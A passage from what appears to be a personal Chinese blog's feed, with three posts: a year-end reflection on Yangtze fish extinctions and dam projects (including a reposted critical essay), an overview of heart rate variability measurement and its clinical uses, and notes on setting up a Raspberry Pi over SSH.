id="把立下的flag和挖的坑填了">把立下的Flag和挖的坑填了</h3><p>填不了就扔到2021年，反正那个时候我就要被消灭了，不用填了</p></div><div class="note danger"><h3 id="扑杀入侵物种">扑杀入侵物种</h3><p>包括不限于流浪猫、流浪狗、红耳龟、福寿螺、克氏原螯虾</p></div><h2 id="近况">近况</h2><p>最近闲了一点，把博客的评论换成了utteranc, 把mathjax换成了katex 试了试Hugo，速度确实快，也没有nodejs这么多依赖问题，但是颜值平均比Hexo低两层楼，Hexo那些插件也没有好的替代和移植。 也没有在Hugo里面找到一个Next这样令我喜欢并且一直维护的主题，只看到一个hugo-book的主题，替代gitbook做文档应该不错，gitbook的生成速度是真的慢。。。 （不过这个快是生成速度啊，整个网站的加载速度跟这个也没有太大关系，也就在写很长很多的内容的时候有，静态博客还是得看效果啊，生成速度再快有什么用呢） ps：终于知道为什么有的人用Jekyll、Hexo、gitbook非要整个CI了，有的内容多了生成速度确实慢啊，动不动几十分钟一小时没了。Hugo的速度让这些都没了必要，我也没看到多少这么搞的（Hugo用户运维和后端开发的比例可比Hexo那些高多了）。（Hugo性能也不错，直接用hugo的server跑在服务器都行，不用Nginx之类的完全没问题。</p><p>元旦在沙河边转着玩，又看到沙河有一群大妈拿着七八个桶直接倾倒鱼和小龙虾（对，就是那个<del>著名</del>入侵物种克氏原螯虾）。这几天网上冲浪又看到日人民报等辣鸡营销号消费过世白鲟，还纷纷把图配成匙吻鲟，心里不是滋味。长江流域基本也凉的差不多了，当年葛洲坝一建，白鲟中华鲟达氏鲟就凉了一半，挖沙和万安水库和富春江水电站也把最后的鲥鱼搞没了。鄱阳湖要是再乱搞，江豚基本也要凉透了（虽然不乱搞也要凉透了，时间问题，无力回天）。那些数不清名字的小鱼就更惨了，好多两个图片和影像都没留下</p><p>哦，对了，前几年长江养殖逃逸了大量杂交鲟，中华鲟和达氏鲟野生种群基本就废了</p><p>寡鳞鱊重现江湖的奇迹可能再也不会有了。</p><blockquote><p>千斤魶子万斤象，黄排大了不像样</p></blockquote><figure><img src="baixun.jpg" alt="白鲟" /><figcaption aria-hidden="true">白鲟</figcaption></figure><p>就现在这样子，不仅斑鳖要上路，鼋八成也保不住；不仅白鱀豚没了，江豚（窄脊江豚长江江豚亚种<em>N. a. asiaeorientalis</em>）也迟早凉。 斑鳖在某动物园的惨状大家应该都知道了，鼋也好不到哪去（国内的龟鳖都好不到哪去） &gt;鼋，到现在，都没有一个像样的保护区。也就是说，救助团体一直是民间（或挂靠）开展的。某保护区我就不点名了，有文件，一直不施工，民间捐的俩成体鼋一直养在水泥池子里……</p><p>最近被骂的<span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vNTAyMTAzNjc4Ni9JbkIxUmZrQkU=">扎龙保护区<i class="fa fa-external-link-alt"></i></span>也是打着保护的旗号干缺德事呢，对了，前几年的鄱阳湖水利枢纽工程也是打着环保的旗号。好多湿地绿化和荒漠绿化都是把原来好好的灌木草地沼泽全种成整齐划一的树，哇，这破坏生态的绿色荒漠算政绩呢 这里全文转载流年消年少同学的一篇旧文：从鄱阳湖水利枢纽工程看看党的千秋伟业</p><div class="note info"><blockquote><p>逆天改命，非以倾国之力而不能为</p></blockquote><p>​​​ 2016年底，微博上因为江西省水利厅一篇《 鄱阳湖水利枢纽环评 请你提建议》的公告引发了不小的风波。无疑这个举动将会对鄱阳湖生态环境造成巨大的负面影响，濒危的长江江豚、白鹤也将为此陷入灭绝的境地，那为什他们会出此下策呢？前几天与老师朋友讨论这个事情，个中缘由可能真的不简单。</p><p>下面都是胡说八道，大家请勿轻信 我们先看看好端端的鄱阳湖​为什么会见底？没错，因为我党的两项“千秋伟业”。 目前，中国两大世纪水利工程——三峡工程早已完成、南水北调工程东线刚刚正通水，中线已经贯通，西线还未开工中。对于如此重大的工程，一直有颇多争议，如修建三峡时，反对意见也非常强烈。三峡建成后，是否会引发干旱、地震等自然灾害都成为了人们热议的焦点。而奇怪的是，南水北调工程几乎没有专家反对，顺利开工建成。对南水北调的质疑也远远不如三峡工程。这是很令人奇怪的地方 多年前，一位旅居德国的国土专家王维洛为就揭底了南水北调和三峡，个中缘由触目惊心。 前几年长江中下游缺水缺得很厉害。从浙江、安徽、江西、湖南和湖北都缺水，特别是湖北省缺水缺的厉害。国内报导是说，湖北的水库都已底朝天，没水了，洪水浪打浪也没浪了。洪湖水也就剩几十厘米深。根本原因是因为湖北省担任了中国两个最大的工程—三峡和南水北调工程。其实这两个工程是一个姐妹工程，密不分，南水北调中线方案的源头工程，就是三峡的水源工程。三峡工程问题突出的原因，并非像国内宣传的那样是什么三峡派海外黑手搞的，其实是国内地方对中央矛盾所引起的。因为干旱现象在湖北和江西已非常突出了。 三峡工程干旱问题的治理，首先是江西省在13年提出来的，是省水利厅一些技术人员要搞鄱阳湖拦水大坝工程。为什么要建这个工程？是因为三峡大坝影响了鄱湖的蓄水，这么引出来的。 2013年的干旱，是当时专家预计的2030年要出现的，那么现在2011年就出现了。而且缺的很厉害，也不像人们说的南方水多，长江流域也将进入枯水，中下游缺缺的很厉害，尤其是湖北省。当时的湖北所有水库几乎是底朝天了。就是南水北调中线工程源头的水库—丹江河水库水位已降到死水位，没有水可以向外排放了。以当时湖北省要求三峡水库赶紧放水。如果当时三峡工程放水的话，就可以看到一个相当可怕的过程，就是说三峡把每天放3000至5000多立方米的水，但是水到湖北地区马上就被抽上去。 鄱阳湖快干枯江西省受不了，为什么？因为中国的抽水工程太厉害了，水泵太厉害了，把长江的水都抽到支流里去了。所以主流水位越往下游水量越少。所以人为自然干涉情况已到了很严重的地步。这种干旱情况未来还会重复出现，而且未来在用水问题上的矛盾还会更尖锐。 南水北调的是中线方案，是指从三峡把水调过去，而不是在丹江口把水调过去。要在三峡把洪水卡住，把三峡的水调到北方去。 长江在历史上流量最小时就有3000多立方/每秒，而黄河平均也就几百立方/每秒，两条河相差很多。长江平均年流量每秒是一万多立方。洪水期流量更大，千年遇的洪水流量大概是九万多立方/每秒，万年一遇的洪水流量是十一万多立方/每秒。如果回到长江的原始状态，其出海口是个湖，湖面宽是20多公里。唐诗中：“帆远影碧空尽，唯见长江天际流”，你会看到那是一条很宽广的河。所以在历史上说长江洪灾很少，而说黄河洪灾的记录就比较多。因为长江下游的蓄水能力很大所以洪水灾害比较小。所以现在长江水位少，而抽水就形成了湖北抽水，湖南就没有多少水可抽，那江西就更受不了，因为水位更低，所以鄱阳湖就像长江的水保住了，因此江西省闹得就特别厉害。 南水北调和三峡里面太多荒唐的东西了，建国以来中国的水利就是在玩水。它根本就不尊重自然规律，想把水折腾到哪儿就折腾到那儿。其实如果中国真的要调水就应该使用地下暗管，就像输油管道一样，埋在地下，又能省地、又没有风险，还能避免人家抢水，能保证进京的水。可是领导人必须让他的功绩让老百姓看得见还得让天上的卫星能够拍得到，比方说隋炀帝修的大运河还留在那儿，南水北调的工程是XXX搞的，三峡工程是XXX的，留在那儿的。 除了领导人，知识分子也是很聪明的，他们是有学习能力的。看看三峡工程中在最后报告上签字的那些专家们，最后都成了工程院和科学院的院士，成了对国家有献的特殊专家和院士，得了这个奖那个奖。你再看那看看那九位没有签名的专家，他们的水平绝对在签了字的人之上，但是没有一个人成为院士。中国的知识份子名利都看得很重，这也不是他们的错。这些还想进入科学最高殿堂的知识份子，他们在三峡工程的学习过程中，知道还是不说的好，说了也没有用。 因为他们的想是步入殿堂，如果他们说了的话，现在很可能连一个科研的题目、科研经费都拿不到。就像黄万里一样，给三峡工程写了那么多的论文，他有一分钱的科研经吗？他从朝廷拿了一分钱的科研经费吗？没有。 所以说，三峡工程在中国的学术界造成了一个很坏的影响，开了一个很坏的先例，后边的人知道了，尽管不是像当初那样被打成右派，可他把你打成另类，没有科经费，那你怎么办！你想当院士，没门。所以他们就不说了。我们一直在玩水的专家学者们，竟忘了一个最浅显的道理：水是从高往低流的，真乃一大黑色幽默。 当一件事，光有赞成而没有批评意见时，这件事错误的可能性很大。当三峡工程和南水北调工程只剩下一位黄万里先生，像唐吉珂德一样批评时，就注定了。 所以，鄱阳湖的现状就是这样， 不建大坝，江西无水可用；建了大坝，毁了白鹤和江豚栖息地。人与自然，在我朝一直就不是可以和谐发展的。 大家都知道这两项伟业贻害万年，谁又敢反对呢？ 民众反对--有个屁用，实在不行给你扣个反贼帽子你试试。地方官员反对--除非你想断送大好前途，呵呵。专学者反对--呵呵，当政者反对--否定前辈路线，自扇耳光。所以，这是一个很现实，也很魔幻的中国特色的伟业。 ~最后，祝伟大祖国繁荣昌盛，千秋万代！</p></div><p>十年之前，我还在上两江，那时候两江很热闹，现在两江也还开着（这里感谢饿老大，坚守到现在不容易）</p><p>在成都的河里湖里随便找找，能看到什么呢，满地食蚊红耳龟福寿螺罗非小龙虾，再找找才能看到点子陵和吸鳅爬鳅之类的，唉</p><blockquote class="blockquote-center"><p>Repair what you can — but when you must fail,fail noisily and as soon as possible.</p></blockquote><p>不知巴拉水电站能否被拦下马，留给川陕哲罗鲑的时间不多了</p><p>十年前，小南海水电站，下马了</p><p><span class="exturl" data-url="aHR0cDovL2NxaDJvLmNvbS9mb3J1bS5waHA/bW9kPXZpZXd0aHJlYWQmYW1wO3RpZD0zMzUxMQ==">坚决反对修建小南海水电站<i class="fa fa-external-link-alt"></i></span></p><p>也罢</p><figure><img src="/aa1c/old.jpg" alt="道子搜山" /><figcaption aria-hidden="true">道子搜山</figcaption></figure><blockquote class="blockquote-center"><p>君不见，高堂明镜悲白发，朝如青丝暮成雪</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;庚子年，格外的长</summary>
    
    
    
    <category term="彼黍离离" scheme="https://zhangjk98.xyz/categories/%E5%BD%BC%E9%BB%8D%E7%A6%BB%E7%A6%BB/"/>
    
    
    <category term="2020" scheme="https://zhangjk98.xyz/tags/2020/"/>
    
  </entry>
  
  <entry>
    <title>也谈心率变异性</title>
    <link href="https://zhangjk98.xyz/2873/"/>
    <id>https://zhangjk98.xyz/2873/</id>
    <published>2019-12-26T04:25:12.000Z</published>
    <updated>2019-12-26T04:25:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>等待填坑 <a id="more"></a></p><h2 id="采集">采集</h2><p>HRV测定的是NN间期(在正常的窦性心律时就是RR间期)的波动，主要与自主神经调控机制有关。标准的HRV根据正常窦性搏动的NN间期得出的（正常对正常间期，normal-to-normal,<em>NN</em> intervals，即由窦房结除极所致相邻QRS波群之间的所有间期）的变化来表示心率的变异性。</p><p><img src="heart-rate-varibility/201804091523323502.png" alt="提取心率变异性" style="zoom: 67%;" /></p><h3 id="心电ecg">心电（ECG）</h3><p>可以从心电图中直接提取R波尖峰并将RR间期的值用于心率变异性分析</p><h3 id="心冲击图bcg">心冲击图（BCG）</h3><p>心冲击图去除呼吸和活动的干扰后提取JJ间期时间计算心率变异</p><h3 id="光电容积图ppg">光电容积图（PPG）</h3><p>目前市面上主要的脉搏波测量方法是光电容积脉搏波描记法（photoplethysmography），用光电传感器检测光经过人体的反射和衰减转换成电信号后得到，包括Apple Waltch等手环产品，用光电容积法检测血氧、心率、心率变异性等生理参数。</p><figure><img src="/2873/figure-1-optical-heart-rate-sensing.jpg" alt="光电容积法原理" /><figcaption aria-hidden="true">光电容积法原理</figcaption></figure><p>PPG法采集到的脉搏波经过去噪和整流等处理后提取PP间期可以计算心率变异。</p><h4 id="远程光电容积扫描">远程光电容积扫描</h4><p>（rPPG，remote PPG）是一种新的方法，只要高清摄像头检测光线变化，真正的无创非接触。</p><p>但是这种方法成本高，易受到运动和光线变化的干扰。目前这个领域比较热门，进展也很快。一些补偿和增强鲁棒性的方法包括全局和局部运动跟踪和独立成分分析等。</p><p>现在此类研究缺乏可靠的公开数据集支持，现有研究大多采用MAHNOB-HCI和DEAP等用于活体识别和情感识别的公开数据集和私有数据集。</p><figure><img src="/2873/figure-3-overview-hr-and-hrv.jpg" alt="rPPG-HRV" /><figcaption aria-hidden="true">rPPG-HRV</figcaption></figure><h2 id="产生机理和影响因素">产生机理和影响因素</h2><figure><img src="/2873/示意图.png" alt="示意图" /><figcaption aria-hidden="true">示意图</figcaption></figure><blockquote><p>HRV反映的是自主神经和非自主神经系统所有反馈回路极其复杂的非线性交互作用。自主神经系统是窦性节律条件下心率的主要调节机制。</p></blockquote><p>忽略微小的影响，HRV的高频部分主要受迷走神经的调节，低频部分受到迷走和交感神经的双重作用。</p><p><img src="/2873/nero2.jpg" /></p><blockquote><p>交感神经增强自律性，而副交感神经抑制自律性。交感神经通过增加起搏点去极化程度产生变时性作用，而对心脏起搏点细胞的迷走刺激会引起超极化而降低去极化程度。自主神经的这两个分支均影响与心脏起搏细胞去极化相关的离子通道的活动。</p></blockquote><p>被测者的体位也会显著影响HRV，多数人处于仰卧位时，副交感神经活动明显增强。</p><p>在突然站立或倾斜时，压力反射活动也会引起心率的同步波动。</p><p>在24小时HRV中，白天交感神经活动相对增强，心率较快，而夜间迷走神经活动增强，心率较慢。正常睡眠时，生理活动也随每个睡眠周期(约90分钟)而呈现明显节律。</p><p>精神情绪的波动也会影响HRV，和迷走神经和交感神经系统的兴奋性有关。</p><p><img src="heart-rate-varibility/image-20191225214555467.png" alt="image-20191225214555467" style="zoom:50%;" /></p><p>此外，非自主神经因素(如神经内分泌功能)也会影响HRV。</p><p>心率变异性也和年龄、性别等因素有关。</p><h2 id="主要指标和数据分析">主要指标和数据分析</h2><h3 id="时域特征">时域特征</h3><p>医学上通常要求5分钟以上的的HRV做短时分析，但是有研究表明30s内的HF和LF和5分钟的没有太大区别，应用是可以进一步缩短检测时间。</p><ul><li><p>SDNN(ms)：NN间期(正常RR间期)的标准差(5分钟)</p></li><li><p>SDANN(ms)：NN间期(正常RR间期)的标准差（24小时）</p></li><li><p>pNN50：相邻NN间期相差&gt;50ms的数量占总心搏数的百 分比</p></li><li><p>rMSSD(ms)：相邻NN间期差值的均方根</p></li></ul><p>rMSSD反映每搏NN间期变化的平均绝对值，对不规律心搏和/或心搏波形标记错误的敏感性也很高。</p><p>24小时记录得到的SDANN值低下表明缺乏昼夜节律。</p><h3 id="频域特征">频域特征</h3><ul><li><p>总功率（TP）：频段≤0. 4Hz。</p></li><li><p>超低频功率（ULF）：频段≤ 0. 003Hz。</p></li><li><p>极低频功率（VLF）：频段 0. 003~0. 04Hz。</p></li><li><p>低频功率（LF）：频段 0. 04~0. 15Hz。</p></li><li><p>高频功率（HF）：频段 0. 15~0. 4Hz。</p></li><li><p>LF/HF: 低频功率和高频功率的比值</p></li></ul><p>LF反映副交感传出神经(迷走神经)和交感传出神经系统活性的综合调节</p><p>HF反映副交感传出神经(迷走神经)活动的调节</p><h3 id="非线性分析">非线性分析</h3><h4 id="动态心电图holter-monitor">动态心电图（Holter monitor）</h4><p>持续记录24小时或更久（几个月或一年以上）的长时间心电图数据，主要用来检测心律失常或传导异常和晕厥或晕厥前兆。</p><p><span class="math inline">\(a\dot{b}c\)</span></p><h5 id="洛伦兹散点图">洛伦兹散点图</h5><p><img src="heart-rate-varibility/201804091524569747.png" alt="img" style="zoom:80%;" /></p><p>把前1个心动周期长度（ms）定为横坐标、后1个心动周期长度（ms）定为纵坐标，即可在直角坐标系中确定一点。这样一个点就由3个QRS波（R波）、2个RR间期决定。第1个RR间期R1R2和第2个RR间期R2R3为第1个点，第2个RR间期R2R3和第3个RR间期R3R4为第2个点，依次类推，从R1 -&gt; Rn作图就可得到 n-2 个点，绘制心率散点图（洛伦兹散点图，Lorenz Plot），判断窦性心率、室上性和室性心率失常。正常窦性心律呈彗星状，心衰、房颤等症状会出现不同的散点图。窦性心律沿45°线分布，呈彗星状</p><p><img src="heart-rate-varibility/image-20191224202624859.png" alt="室性早搏" style="zoom: 67%;" /></p><p><img src="heart-rate-varibility/image-20191224202756257.png" alt="房性早搏" style="zoom: 67%;" /></p><p>散点图可用于：</p><p>评价心率波动范围（散点图的位置分布）</p><p>评价自主神经调节（长轴）</p><p>评价心率变异（短轴）</p><p>诊断心律失常（散点图的形态）</p><h5 id="差值散点图">差值散点图</h5><p>首先对序列 <span class="math inline">\(RiR_{i+1}\)</span> 做一阶差分, 得到序列 <span class="math inline">\(d_j ,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p><p>首先对序列<span class="math inline">\(R_iR_{i\times1}\)</span>做一阶差分, 得到序列 <span class="math inline">\(d_j,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p><figure><img src="/2873/image-20191225111057030.png" alt="健康人和CHF患者的散点图" /><figcaption aria-hidden="true">健康人和CHF患者的散点图</figcaption></figure><h5 id="三维散点图">三维散点图</h5><p>三维散点图的一些意义还不明确，医院里实际用的也很少 <img src="/2873/3D-scatter-plot.png" alt="心率变异性三维散点图" /></p><h5 id="心率震荡hrt">心率震荡（HRT）</h5><p>心率震荡（heart rate turbulence）是指发生室性早搏后，窦性心律出现短暂的加速和减速的过程。检测HRT异常有助于预测自主神经功能障碍以及心血管事件的风险增加。</p><p>分析HRT通常需要24小时HRV动态心电图，主要有震荡初始(turbulence onset, TO)和震荡斜率(turbulence slope, TS)两个指标。</p><h2 id="临床价值和应用">临床价值和应用</h2><h3 id="心肌梗死死亡率预测">心肌梗死死亡率预测</h3><p>心梗后早期(14日内)，若检测到患者的HRV指标降低，则心梗后3年内的死亡风险增至3-4倍。</p><h3 id="心力衰竭">心力衰竭</h3><p>已知就预后而言，HRV降低是总体死亡、心力衰竭死亡、心脏性猝死、室性心律失常和心脏移植的 独立预测指标</p><h3 id="评估自主神经病变">评估自主神经病变</h3><p>HRV明显降低或缺失可以作为辅助指标。</p><h3 id="冠心病">冠心病</h3><p>冠心病患者的HRV显著降低,且与冠状动脉病变支数及狭窄程度呈负相关,但与冠状动脉病变部位无关。</p><h3 id="检测精神压力">检测精神压力</h3><p>短时HRV变化可用于辅助检测精神压力</p><p>迷走神经的冲动传导频率受呼吸频率和深度的调节而呈现节律性波动，呼吸性窦性心律不齐(respiratory sinus arrhythmia, RSA)。在有节奏的呼吸或冥想时，RSA可被放大。</p><h3 id="评估体育表现">评估体育表现</h3><p>可以作为推测无氧阈的较为精确的指标之一</p><blockquote><p>注意 在运动评估中一般只有要求无伤等才会首先考虑HRV，一般是用血清肌酸激酶(CK)、血清睾酮(T)、血红蛋白、乳酸等</p></blockquote><h3 id="监测训练负荷及诊断运动性疲劳">监测训练负荷及诊断运动性疲劳</h3><p>交感一副交感神经张力的平衡会随着运动强度的改变而波</p><h3 id="运动康复医学领域">运动康复医学领域</h3><p>用于自主神经功能改善的评估</p><h3 id="睡眠分期">睡眠分期</h3><p>略</p><h2 id="其他">其他</h2><h3 id="呼吸和心率变异性">呼吸和心率变异性</h3><h4 id="bcg信号中的呼吸信息">BCG信号中的呼吸信息</h4><p>在采集到的BCG信号中，会包含呼吸信息，提取心率变异性通常要去除呼吸的干扰。</p><p>但是在一些利用HRV进一步分析情绪、压力、睡眠分期的时候，可以考虑保留部分呼吸特征并将呼吸特征纳入到检测和分类中，有时可以提高检测的准确率。</p><p>在心率变异性分析中纳入呼吸频率信息以进行压力评估</p><h4 id="呼吸变异性">呼吸变异性</h4><p>呼吸频率变异性(Respiratory Rate Variability，RRV, 有的地方也叫Breath Rate Variability），和心率变异性一样反映了一些生理特征，但是这种非电信号采集难，噪声大，不规律，包含的信息也比心电和脉搏波等信号少。除了</p><p>目前对于RRV的研究比较少，也很少有人用这个特征做睡眠分期检测、疲劳压力检测或睡眠呼吸暂停的检测。一些使用雷达等手段检测疲劳或者睡眠的研究将这项指标作为判断依据。雷达和监控视频等可以在较近的距离探测人体呼吸活动和心率，但是这样采集分离出的心动信息用作睡眠和疲劳监测不如直接采集呼吸和运动的信息进行分析。对于体重指数（body mass index ）过高的的超重人群、较复杂的干扰和活动等情景，使用雷达等方式检测压力或疲劳时HRV准确率大幅降低，从心动信息检测不如直接从呼吸信息检测。在这些场景下会使用呼吸和体动信息来作为指标。</p><h2 id="数据和软件">数据和软件</h2><ol type="1"><li><span class="exturl" data-url="aHR0cHM6Ly93d3cua3ViaW9zLmNvbS9ocnYtc3RhbmRhcmQv">https://www.kubios.com/hrv-standard/<i class="fa fa-external-link-alt"></i></span> 免费的HRV分析软件</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGh5c2lvbmV0Lm9yZy8jbGF0ZXN0">https://www.physionet.org/#latest<i class="fa fa-external-link-alt"></i></span> 心电图数据</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1EX0tZdjdwWEF2UQ==">https://www.youtube.com/watch?v=D_KYv7pXAvQ<i class="fa fa-external-link-alt"></i></span> rPPG检测心率</li><li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2JvYi5ycHBnLmJhc2Uv">https://pypi.org/project/bob.rppg.base/<i class="fa fa-external-link-alt"></i></span> rPPG的开源库，数据集MAHNOB-HCI和DEAP</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHJ2NHRyYWluaW5nLmNvbS8=">https://www.hrv4training.com/<i class="fa fa-external-link-alt"></i></span> 一个用蓝牙测HRV的APP，准确率貌似还可以</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZmlyc3RiZWF0LmNvbS9lbi9maXJzdGJlYXQtaHJ2LXN1bW1pdC0yMDE5Lw==">Firstbeat HRV Summit<i class="fa fa-external-link-alt"></i></span> Firstbeat公司的HRV峰会，一些商用搞的比较好的东西</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;等待填坑</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="HRV" scheme="https://zhangjk98.xyz/tags/HRV/"/>
    
    <category term="BCG" scheme="https://zhangjk98.xyz/tags/BCG/"/>
    
  </entry>
  
  <entry>
    <title>试图抢救吃灰的树莓派</title>
    <link href="https://zhangjk98.xyz/7042/"/>
    <id>https://zhangjk98.xyz/7042/</id>
    <published>2019-12-07T11:52:23.000Z</published>
    <updated>2019-12-07T11:52:23.000Z</updated>
    
    <content type="html"><![CDATA[<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.602ex" xmlns="http://www.w3.org/2000/svg" width="2.127ex" height="4.638ex" role="img" focusable="false" viewBox="0 -1342 940 2050"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220, 676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220, -686)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span></p><p>自从来到沙河102网吧，都是在工作站/服务器/台式机上折腾，树莓派一直仍在清水河宿舍吃灰。今天回了趟清水河，把树莓派拿回来，试试能不能用，打算做备用测试机了。 <a id="more"></a> ## 装系统</p><p>从官网下载<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>, 我下的Raspbian Buster（SD卡就只有16G，不打算搞那些recommend software了），解压之后已经是3.56G了</p><p>然后用Rufus烧进SD卡（很多教程全是推荐Win32Diskimager，那个并没有Rufus好用），只选第一行的目标设备和第二行引导镜像，其他默认（卡里之前有东西的话还是用SD Formatter先刷一遍）</p><p>2020.3 更新</p><p>貌似树莓派官方出了一个写入SD卡的<span class="exturl" data-url="aHR0cHM6Ly93d3cucmFzcGJlcnJ5cGkub3JnL2Jsb2cvcmFzcGJlcnJ5LXBpLWltYWdlci1pbWFnaW5nLXV0aWxpdHkv">工具<i class="fa fa-external-link-alt"></i></span>，可以去试试</p><p>然后将SD卡查到卡槽里，再把显示器接上（我工位上的ROC显示器有HDMI接口和电源, 终于不用无显示器安装拿个笔记本上来就SSH折腾了）</p><p>不行，搜了一下看到config.txt文件里有</p><pre class="line-numbers language-none"><code class="language-none"># uncomment to force a specific HDMI mode (this will force VGA)#hdmi_group=1#hdmi_mode=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>要把模式改一下啊</p><pre class="line-numbers language-none"><code class="language-none">hdmi_group=2hdmi_mode=58<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样感觉还是不方便，还要占掉我一个大屏。改回了SSH连接的方式</p><p>在boot目录新建SSH文件夹，然后新建一个wpa_supplicant.conf的文件配置WIFI</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">country=CNctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=<span class="token number">1</span>network=<span class="token punctuation">{</span>    ssid=<span class="token string">"你的WIFI名"</span>    psk=<span class="token string">"你的密码"</span>    key_mgmt=WPA-PSK    priority=<span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后路由器找到ip，SSH连就行了，默认账号pi password：raspberry</p><p>发现这个树莓派真的鸡肋啊，扔着吃灰又可惜，不折腾硬件和IO不在乎功耗又不如有1080的工作站和20核CPU的服务器好（而且这俩还有公网IP和端口）</p><p>算了，每次折腾完了就后悔。 本逃兵不打算折腾硬件了，从医疗测控电路到stm32到树莓派的IO，都不太想碰了。时代变了，七八十年代的硅谷才是搞硬件的地方，二十一世纪是...反正不是硬件狗的世纪。251牢厂、加班狂魔联影、毁约的迈瑞，只想让人看了跑路。。。</p><p>服务器，启动。树莓派，关机。</p><h2 id="注">注</h2><section class="footnotes" role="doc-endnotes"><hr><ol><li id="fn1" role="doc-endnote"><p>http://downloads.raspberrypi.org/<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;&lt;mjx-container class=&quot;MathJax&quot; jax=&quot;SVG&quot; display=&quot;true&quot;&gt;&lt;svg style=&quot;vertical-align: -1.602ex&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;2.127ex&quot; height=&quot;4.638ex&quot; role=&quot;img&quot; focusable=&quot;false&quot; viewBox=&quot;0 -1342 940 2050&quot;&gt;&lt;g stroke=&quot;currentColor&quot; fill=&quot;currentColor&quot; stroke-width=&quot;0&quot; transform=&quot;matrix(1 0 0 -1 0 0)&quot;&gt;&lt;g data-mml-node=&quot;math&quot;&gt;&lt;g data-mml-node=&quot;mfrac&quot;&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(220, 676)&quot;&gt;&lt;path data-c=&quot;31&quot; d=&quot;M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;g data-mml-node=&quot;mn&quot; transform=&quot;translate(220, -686)&quot;&gt;&lt;path data-c=&quot;33&quot; d=&quot;M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;rect width=&quot;700&quot; height=&quot;60&quot; x=&quot;120&quot; y=&quot;220&quot;&gt;&lt;/rect&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/mjx-container&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;自从来到沙河102网吧，都是在工作站/服务器/台式机上折腾，树莓派一直仍在清水河宿舍吃灰。今天回了趟清水河，把树莓派拿回来，试试能不能用，打算做备用测试机了。</summary>
    
    
    
